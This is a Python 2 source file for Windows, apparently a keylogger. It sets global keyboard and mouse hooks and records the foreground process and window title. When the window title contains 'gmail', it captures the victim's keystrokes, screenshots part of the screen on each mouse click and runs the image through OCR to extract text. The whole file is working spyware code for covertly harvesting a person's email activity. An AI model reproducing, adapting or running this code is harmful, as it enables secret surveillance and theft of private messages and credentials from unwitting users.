from ctypes import *
import ctypes
import pythoncom
import pyHook 
import win32clipboard
import time
import sys
from PIL import ImageGrab,Image
import googleOCR

global kl
num = 0
user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None
tmp = False
finished = False
window_title = None

def get_current_process():

    global tmp

    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # now read it's title
    global window_title 
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # print out the header if we're in the right process
    print
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):  

    global current_window,tmp,window_title
    #check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()
    # if they pressed a standard key
    
    #print window_title.value
    #print chr(event.Ascii)
    if window_title != None:
        if "gmail" in window_title.value:    
            if event.Ascii > 32 and event.Ascii < 127:
                tmp = False
                print chr(event.Ascii)
                Mouse()
        #else:
            #pass
        
    return True

def screenshot():
    
    global num,finished
    pic = ImageGrab.grab(bbox=(1118,400,1825,1070))
    pic.save('screenshop.jpg')
    print "[Image Saved]"
    time.sleep(0.5)
    googleOCR.main('screenshop.jpg','output.txt')
    finished = True
    print" 分析完成"
   
       

def onMouseEvent(event):
    global tmp
    if tmp == False:        
        screenshot()
        tmp = True
        
    return True
    

def Mouse():
    
    global kl
    # 開始監聽
    kl.MouseLeftUp = onMouseEvent
    # 建立鉤子
    kl.HookMouse()
    return
if __name__=='__main__':

# create and register a hook managecr 
    kl         = pyHook.HookManager()
    kl.KeyDown = KeyStroke

# register the hook and execute forever
    kl.HookKeyboard()
    pythoncom.PumpMessages()
